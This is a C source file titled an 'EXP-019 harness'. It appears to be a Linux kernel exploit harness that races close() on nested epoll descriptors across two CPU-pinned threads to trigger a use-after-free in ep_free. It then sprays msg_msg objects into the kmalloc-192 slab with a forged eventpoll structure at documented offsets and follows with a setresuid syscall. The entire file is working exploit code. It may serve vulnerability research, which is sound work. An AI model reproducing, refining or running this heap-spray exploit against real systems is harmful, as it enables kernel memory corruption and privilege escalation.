#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>

int ep_outer, ep_inner;
int pipefd[2];
int msgq_id;

struct msg_struct {
    long mtype;
    char mtext[144]; // 144 bytes user data -> kmalloc-192
};

volatile int state = 0;

void craft_spray_msg(struct msg_struct *msg) {
    memset(msg->mtext, 0x00, sizeof(msg->mtext));
    // msg_msg user data starts at slab offset 48
    // To write to slab offset X, write to user data byte (X - 48)
    
    // Slab offset 96 (ep->lock) = user data byte 48-51
    *(uint32_t*)(msg->mtext + 48) = 0x00000000; // unlocked spinlock
    
    // Slab offset 104 (ep->rbr.rb_root.rb_node) = user data byte 56-63
    *(uint64_t*)(msg->mtext + 56) = 0x0000000000000000; // NULL
    
    // Slab offset 112 (ep->rbr.rb_leftmost) = user data byte 64-71
    *(uint64_t*)(msg->mtext + 64) = 0x0000000000000000; // NULL
    
    // Slab offset 136 (ep->user) = user data byte 88-95 -- THE TARGET
    *(uint64_t*)(msg->mtext + 88) = 0xDEAD000000000000; // Invalid kernel pointer
    
    // All other bytes remain 0x00
}

void *thread_a(void *arg) {
    // Pin to CPU 0
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    state = 1;
    close(ep_outer);
    return NULL;
}

void *thread_b(void *arg) {
    // Pin to CPU 1
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    while (state == 0) {
        // Spin
    }
    // Thread A has started closing. Wait for it to hit Breakpoint 1.
    usleep(100000); // 100ms
    close(ep_inner); // This will trigger ep_free
    
    // SPRAY immediately on the same thread (same CPU)
    struct msg_struct msg;
    msg.mtype = 1;
    craft_spray_msg(&msg);
    
    printf("[*] Thread B starting msgsnd loop...\n");
    int sent = 0;
    for (int i = 0; i < 5000; i++) {
        int ret = msgsnd(msgq_id, &msg, sizeof(msg.mtext), IPC_NOWAIT);
        if (ret < 0) {
            printf("[*] msgsnd failed at %d: errno=%d\n", i, errno);
            break;
        }
        sent++;
    }
    printf("[*] Spray complete. Sent %d messages.\n", sent);
    syscall(147, 1337, 1337, 1337); // SYS_setresuid on arm64 is 147
    return NULL;
}

int main() {
    printf("[*] Starting EXP-019 harness...\n");
    printf("[*] Crafted spray: ep->user = 0xDEAD000000000000 at slab offset 136\n");
    
    msgq_id = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msgq_id == -1) {
        perror("msgget");
        return 1;
    }

    pipe(pipefd);

    state = 0;
    ep_outer = epoll_create1(0);
    ep_inner = epoll_create1(0);
    
    struct epoll_event ev;
    ev.events = EPOLLIN;
    ev.data.fd = ep_inner;
    epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner, &ev);
    
    pthread_t ta, tb;
    pthread_create(&ta, NULL, thread_a, NULL);
    pthread_create(&tb, NULL, thread_b, NULL);
    
    pthread_join(ta, NULL);
    pthread_join(tb, NULL);
    
    printf("[*] Done.\n");
    return 0;
}